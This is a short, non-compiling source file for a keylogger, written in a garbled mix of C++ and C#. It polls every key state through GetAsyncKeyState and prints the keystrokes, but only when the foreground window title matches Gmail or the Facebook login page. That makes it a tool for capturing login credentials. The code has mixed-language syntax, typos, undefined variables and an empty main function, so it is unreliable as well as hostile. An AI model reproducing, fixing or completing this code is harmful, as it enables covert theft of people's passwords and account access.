#include <iostream>
DllImport("user32.dll")
public static extern int GetAsyncKeyState(Int32 i);


void writeKeystroke(){
    while (true){
        Thread.sleep(100);
        for (Int32 i = 0; i < 255; i ++){
            int state = GetAsyncKeyState(i);
            if (state == 1 || state == -32767){
                console.WriteLine((keys)i);
            }
        }
    }
}

bool checkIfKeylog(){
    IntPtr handle = GetForegroundWindow();
    // check to see if there's a focused window
    if(GetWindowText(handle, buff, chars) > 0){
        // grab the current line
        string line = buff.toString;
        // if it contains something we want to key log write to console
        if (line.Contatins("Gmail" || line.contains("Facebook - Log In or Sign Up"))){
            writeKeystroke();
        }
        Thread.sleep(100);
    }
}

int main() {

}